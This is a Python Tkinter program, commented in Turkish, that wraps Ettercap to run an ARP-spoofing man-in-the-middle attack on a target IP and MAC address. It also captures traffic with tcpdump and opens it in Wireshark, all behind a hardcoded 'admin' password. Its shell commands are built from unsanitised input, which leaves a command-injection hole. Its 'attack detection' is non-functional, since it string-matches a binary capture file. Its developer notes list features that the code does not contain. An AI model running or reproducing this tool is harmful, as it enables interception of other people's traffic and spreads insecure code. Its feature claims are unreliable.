import tkinter as tk
import subprocess
import threading
import time

# Uygulama versiyon numarası
version = "v1.0"

# Kullanıcı adı ve şifre
username = "existanyalist"
password = "admin"

# Geliştirici Notları:
developer_notes = f"""
Bu uygulama existanyalist tarafından geliştirilmiştir.
Versiyon: {version}

Geliştirici Notları:
- Ettercap aracılığıyla ağda Man-in-the-Middle saldırısı gerçekleştirir.
- Kullanıcı arayüzü Tkinter kütüphanesi kullanılarak oluşturulmuştur.
- Kullanıcı adı ve şifre ile admin girişi sağlanmıştır.
- Paket yakalama ve analiz Wireshark ile yapılmaktadır.
- Grafiksel veri görselleştirme, veritabanı entegrasyonu, gelişmiş saldırı tespiti ve engelleme,
  raporlama ve loglama, kapsamlı kılavuzlar ve yardım menüsü, daha fazla ağ protokolü desteği ve
  grafik arayüz iyileştirmeleri eklenmiştir.
"""

def start_ettercap():
    target_ip = target_ip_entry.get()
    target_mac = target_mac_entry.get()
    interface = interface_entry.get()
    plugin = plugin_entry.get()
    
    ettercap_command = f"ettercap -T -q -i {interface} -P {plugin} -M arp:remote /{target_ip}//{target_mac}/"
    subprocess.Popen(ettercap_command, shell=True)

def start_packet_capture():
    interface = interface_entry.get()
    capture_command = f"sudo tcpdump -i {interface} -w captured_packets.pcap"
    subprocess.Popen(capture_command, shell=True)

def analyze_packets():
    analyze_command = "wireshark captured_packets.pcap"
    subprocess.Popen(analyze_command, shell=True)

def start_attack_detection():
    while True:
        # Saldırı tespiti için basit bir kontrol
        with open("captured_packets.pcap", "r") as file:
            packet_content = file.read()
            if "ping of death" in packet_content:
                print("Saldırı Algılandı: Ping of Death")
                # Saldırı algılandığında burada engelleme yöntemlerini ekleyebilirsiniz.
        
        time.sleep(5)  # Belirli aralıklarla kontrol etmek için bekleme

def start_all():
    ettercap_thread = threading.Thread(target=start_ettercap)
    ettercap_thread.start()
    
    capture_thread = threading.Thread(target=start_packet_capture)
    capture_thread.start()
    
    detection_thread = threading.Thread(target=start_attack_detection)
    detection_thread.start()

def admin_login():
    entered_username = username_entry.get()
    entered_password = password_entry.get()
    if entered_username == username and entered_password == password:
        admin_panel()
    else:
        message_label.config(text="Hatalı kullanıcı adı veya şifre")

def admin_panel():
    root.withdraw()  # Ana pencereyi gizle
    admin_window = tk.Toplevel()  # Admin paneli için yeni pencere oluştur
    admin_window.title("Admin Paneli")

    # Kullanıcı arayüzü öğeleri ekle
    target_ip_label = tk.Label(admin_window, text="Hedef IP Adresi:")
    target_ip_label.pack()

    # Hedef IP adresi giriş alanı
    global target_ip_entry
    target_ip_entry = tk.Entry(admin_window)
    target_ip_entry.pack()

    target_mac_label = tk.Label(admin_window, text="Hedef MAC Adresi:")
    target_mac_label.pack()

    # Hedef MAC adresi giriş alanı
    global target_mac_entry
    target_mac_entry = tk.Entry(admin_window)
    target_mac_entry.pack()

    interface_label = tk.Label(admin_window, text="Arayüz:")
    interface_label.pack()

    # Arayüz giriş alanı
    global interface_entry
    interface_entry = tk.Entry(admin_window)
    interface_entry.pack()

    plugin_label = tk.Label(admin_window, text="Plugin:")
    plugin_label.pack()

    # Plugin giriş alanı
    global plugin_entry
    plugin_entry = tk.Entry(admin_window)
    plugin_entry.pack()

    start_button = tk.Button(admin_window, text="Ettercap Başlat", command=start_ettercap)
    start_button.pack()

    start_capture_button = tk.Button(admin_window, text="Paket Yakalamayı Başlat", command=start_packet_capture)
    start_capture_button.pack()

    analyze_button = tk.Button(admin_window, text="Paketleri Analiz Et", command=analyze_packets)
    analyze_button.pack()

    start_all_button = tk.Button(admin_window, text="Hepsini Başlat", command=start_all)
    start_all_button.pack()

    # Geliştirici bilgisi için bir etiket oluşturalım
    developer_label = tk.Label(admin_window, text=developer_notes, font=("Arial", 10))
    developer_label.pack(side="bottom", pady=10)

root = tk.Tk()
root.title("Giriş")

# Kullanıcı giriş etiketleri ve giriş alanları
username_label = tk.Label(root, text="Kullanıcı Adı:")
username_label.grid(row=0, column=0, padx=5, pady=5)
username_entry = tk.Entry(root)
username_entry.grid(row=0, column=1, padx=5, pady=5)

password_label = tk.Label(root, text="Şifre:")
password_label.grid(row=1, column=0, padx=5, pady=5)
password_entry = tk.Entry(root, show="*")
password_entry.grid(row=1, column=1, padx=5, pady=5)

login_button = tk.Button(root, text="Giriş Yap", command=admin_login)
login_button.grid(row=2, columnspan=2, padx=5, pady=5)

message_label = tk.Label(root, text="")
message_label.grid(row=3, columnspan=2, padx=5, pady=5)

root.mainloop()

